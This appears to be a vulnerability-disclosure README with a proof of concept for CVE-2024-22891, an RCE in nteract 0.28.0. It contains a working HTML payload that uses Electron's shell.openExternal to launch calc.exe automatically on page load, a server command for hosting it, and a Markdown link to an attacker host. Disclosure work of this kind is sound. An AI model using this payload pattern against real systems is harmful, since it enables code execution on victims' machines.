# Nteract PoC
A Proof-Of-Concept for CVE-2024-22891 vulnerability. <br><br>
nteract 0.28.0 allows Electron webview via Markdown link, with resultant remote code execution.

In this repository there is an example vulnerable application and proof-of-concept (POC) exploit of it.
As a PoC there is a python file that automates the process. 
---------------------------------------

#### 1.Vunerability Overview:
 * Vulnerability Subject: Markdown link RCE
 * Vulnerability Type: Other: Open Redirect
 * Manifestation of the Issue: Electron Webview
 * Affected Component: markdown
 * Attack Type: Remote Code Execution
 * Attack Vectors: To exploit the vulnerability, someone must click on the link or access the shared project's link.
 * Reserved CVE Number: CVE-2024-22891 
---------------------------------------

#### 2. Vulnerability Cause:
* nteract 0.28.0 allows Electron webview via Markdown link, with resultant remote code execution (because nodeIntegration in webPreferences is true).

* Exploit explain
  * When generating links through MarkDown within the application, it creates a WebView via Electron, allowing external access to the link. Consequently, an attacker can achieve Remote Code Execution (RCE) by connecting to the link leading to the attacker's server.

Proof-of-concept (POC)
----------------------
**Step 1) Attacker make server to Source code for launching a calc.exe using openExternal() function.**
```html
<html>
<head>
    <title>jruru Link</title>
</head>
<body>
    <a id="jruruLink">jruru Link</a>

    <script>
         // Script function definition
        function openExternal() {
            try {
                const { shell } = require('electron');
                shell.openExternal('file:C:/Windows/System32/calc.exe');
            } catch(e) {
                alert('JRURU - External link cannot be opened.');
                console.error(e);
            }
        }
        // Automatically execute openExternal function after the page is loaded
        document.addEventListener('DOMContentLoaded', function() {
            openExternal();
        });
    </script>
</body>
</html>
```
**Note:** ※ If you want to test it quickly, create a server on the attacker's PC with the following code.

```py
$ python -m http.server 80
```


**Step 2) Execute the nteract application on the victim's system and create a Markdown link, or share the attacker's ipynb file as an example code. Then, execute calc.exe.**
```markdown
[Read This] (http://[attcker_adress]/shard_data.html)
```
![neteract](https://github.com/QnA4u/CVE/assets/131337101/f0dc7882-9376-4cd6-8432-241283d200b7)
![nteract2](https://github.com/QnA4u/CVE/assets/131337101/8b596f50-6c4e-40b5-a835-4dee96517314)

---------------------------------------

### 3. Additional Information
When executing a .ipynb file through file sharing, be cautious as the link may not be visible.This calc.exe could have been any malicious payload local or remote which could have given the attacker entire access to the victim’s system. 
